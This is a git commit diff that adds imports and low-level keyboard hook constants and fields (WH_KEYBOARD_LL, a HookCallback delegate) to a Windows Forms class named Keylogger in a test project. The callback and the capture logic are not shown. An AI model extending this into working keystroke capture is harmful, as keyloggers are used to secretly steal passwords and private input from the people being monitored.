5495bd9dd3c256ae9bb46f8876d0530ec02631af
Reyvilo <margerit.olivier@gmail.com>
2015-05-26 11:02:51 +0200

    sd

--- Interface/TestProject/Keylogger.cs
+++ Interface/TestProject/Keylogger.cs
@@ -6,12 +6,21 @@ using System.Drawing;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.Diagnostics;
 using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.IO;
 
 namespace TestProject
 {
     public partial class Keylogger : Form
     {
+
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static IntPtr _hookID = IntPtr.Zero;
+
         public Keylogger()
         {
             InitializeComponent();
